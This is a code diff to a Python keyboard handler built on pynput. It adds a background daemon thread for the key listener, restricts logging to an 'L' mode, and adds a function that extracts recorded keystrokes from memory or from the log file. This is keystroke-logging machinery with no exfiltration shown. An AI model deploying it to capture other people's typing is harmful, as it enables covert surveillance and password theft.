@@ -1,13 +1,12 @@
 import datetime
 import os
 import sys
+import threading
 import time
 from typing import List, Dict, Set, Union, Optional
 
 from pynput import keyboard
 
-# shared flag that port.py will modify
-typing_active = False
 
 KeyType = Union[keyboard.Key, keyboard.KeyCode]
 
@@ -73,7 +72,6 @@ class KeyboardHandler:
         keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
     }
 
-
     # Canonical logical names for modifier keys
     CANONICAL_MODIFIERS: Dict[keyboard.Key, str] = {
         keyboard.Key.shift: "Shift",
@@ -103,7 +101,7 @@ class KeyboardHandler:
         self.last_press_time: float = 0.0
 
         # Rolling buffer of keystrokes normalizing strings)
-        self.keystrokes_recorded: List[str] = []
+        self.keystrokes_recorded: List[str] = list()
         self.keystrokes_recorded_size: int = 100
 
         self.log_file: str = log_file
@@ -111,13 +109,17 @@ class KeyboardHandler:
         # Current modifiers being held down (e.g. {"Ctrl", "Shift"})
         self.pressed_modifiers: Set[str] = set()
 
-        self.keystrokes_cache: Dict[int, str] = {}
+        self.keystrokes_cache: Dict[int, str] = dict()
         self.keystrokes_cache_size: int = 100
 
         # Initialize log header
         self._write_session_header()
 
     # ---------- Public Interface ----------
+
+    def start_in_background(self) -> None:
+        t = threading.Thread(target=self.start, daemon=True)
+        t.start()
 
     def start(self) -> None:
         """Starts the keyboard listener (blocking call)."""
@@ -185,7 +187,6 @@ class KeyboardHandler:
 
     def on_press(self, key: KeyType) -> None:
         """Handle key press event."""
-        global typing_active
 
         current_time = time.time()
         time_since_last_press = current_time - self.last_press_time
@@ -193,7 +194,7 @@ class KeyboardHandler:
 
         print(f"Time since last key press: {time_since_last_press:.2f} seconds")
 
-        if self.mode == "I" or typing_active:
+        if not self.mode == "L": # If not in logging mode
             return
 
         # Special keys (including modifiers)
@@ -239,8 +240,65 @@ class KeyboardHandler:
 
         return None
 
-    # ---------- I/O helpers ----------
+    # ---------- EXTRATION: ---------- 
+    def extract_logged_keys(self, source: str = "memory", limit: Optional[int] = None) -> List[str]:
+        """
+        Extract logged keystrokes.
+        :param source: "memory" or "file"
+            - "memory": returns the in-memory rolling buffer (what this process saw)
+            - "file":   parses the log file and returns tokens (last session only)
+        :param limit: if given, only return the last N tokens
+        :return: list of normalized keystroke tokens, e.g. ["h", "e", "l", "l", "o", "<Backspace>"]
+        """
 
+        if source == "memory":
+            data = list(self.keystrokes_recorded)  # shallow copy
+            if limit is not None:
+                return data[-limit:]
+            return data
+
+        if source == "file":
+            if not os.path.exists(self.log_file):
+                return []
+
+            with open(self.log_file, "r") as f:
+                lines = f.readlines()
+
+            # Split file into sessions by the "====" header line,
+            # and only consider the last session.
+            sessions: List[List[str]] = []
+            current: List[str] = []
+
+            for line in lines:
+                if line.strip().startswith("=" * 10):  # matches "==========..." header line
+                    # new session starts
+                    if current:
+                        sessions.append(current)
+                        current = []
+                    # don't include header line as a keystroke
+                    continue
+                current.append(line.rstrip("\n"))
+
+            if current:
+                sessions.append(current)
+
+            if not sessions:
+                return []
+
+            last_session_lines = sessions[-1]
+
+            # Now filter out empty lines and return tokens as-is
+            tokens = [ln for ln in last_session_lines if ln.strip()]
+
+            if limit is not None:
+                return tokens[-limit:]
+            return tokens
+
+        # Fallback: unknown source
+        raise ValueError(f"Unknown extraction source: {source!r}")
+
+
+    # I/O helpers
     def write_to_file(self, key_data: str) -> None:
         with open(self.log_file, "a") as f:
             f.write(key_data)
